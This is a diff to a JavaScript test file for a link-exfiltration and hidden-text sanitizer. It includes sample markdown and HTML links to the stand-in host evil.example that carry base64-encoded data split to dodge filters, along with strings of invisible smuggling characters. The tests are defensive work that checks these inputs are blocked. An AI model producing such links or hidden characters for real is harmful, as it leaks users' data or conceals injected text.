@@ -63,3 +63,9 @@ test("punctuation before a line break cannot hide the rest of a URL", () => {
   assert.ok(blocked("[x](https://evil.example/p?d=ZGFuYS5yZXllc0;\tBub3J0aHdpbmQuZXh;\thbXBsZQZGFuYS5yZX)"));
   assert.ok(blocked("<a href=https://ZGFuYS5yZXllc0B\nub3J0aHdpbmQuZXh.evil.example/>x</a>")); // host judged on the joined URL
 });
+
+test("strips more invisible smuggling characters but keeps emoji", () => {
+  const r = plug("a\u00ADb\uFEFFc\u3164d" + String.fromCodePoint(0xe0100) + "e \u2764\uFE0F");
+  assert.equal(r.text, "abcde \u2764\uFE0F");
+  assert.equal(r.findings[0].type, "HIDDEN_TEXT");
+});
